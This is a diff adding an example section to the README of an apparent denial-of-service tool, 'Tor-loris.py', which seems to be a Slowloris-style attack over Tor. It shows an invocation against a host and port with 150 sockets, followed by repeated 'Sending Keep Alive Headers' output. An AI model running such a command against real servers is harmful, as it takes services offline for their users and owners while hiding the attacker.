@@ -42,4 +42,30 @@
  
         $ ./Tor-loris.py -H <host> -P <port> -M <max-sockets Default=150>
 
+**Example**
+          
+	$ ./Tor-loris.py -H 192.168.1.160 -P 80 -M 150 
+	     _______           _            _     
+            |__   __|         | |          (_)    
+               | | ___  _ __  | | ___  _ __ _ ___ 
+               | |/ _ \| '__| | |/ _ \| '__| / __|
+               | | (_) | |    | | (_) | |  | \__ \
+               |_|\___/|_|    |_|\___/|_|  |_|___/
+                                                                                                   
+          
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+	Sending Keep Alive Headers... Socket Count: 150
+
+
 
